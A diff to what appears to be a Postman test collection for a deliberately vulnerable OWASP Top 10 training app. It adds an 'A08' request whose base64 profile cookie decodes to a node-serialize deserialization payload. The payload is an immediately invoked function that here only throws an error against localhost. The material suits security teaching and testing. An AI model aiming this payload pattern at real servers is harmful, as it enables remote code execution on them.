@@ -225,6 +225,32 @@
           "response": []
         }
       ]
+    },
+    {
+      "name": "A08: Software and Data Integrity Failures",
+      "items": [
+        {
+          "name": "A08: Get profile from cookie",
+          "request": {
+            "method": "GET",
+            "header": [
+							{
+								"key": "Cookie",
+								"value": "profile=eyJpZCI6MSwidXNlcm5hbWUiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge1xuICAgIHRocm93IG5ldyBFcnJvcignc2VydmVyIGVycm9yJylcbiAgfSgpIn0=",
+								"type": "text"
+							}
+						],
+            "body": {},
+            "url": {
+              "raw": "localhost:3000/profile",
+              "host": ["localhost"],
+              "port": "3000",
+              "path": ["profile"]
+            }
+          },
+          "response": []
+        }
+      ]
     }
   ],
   "auth": {
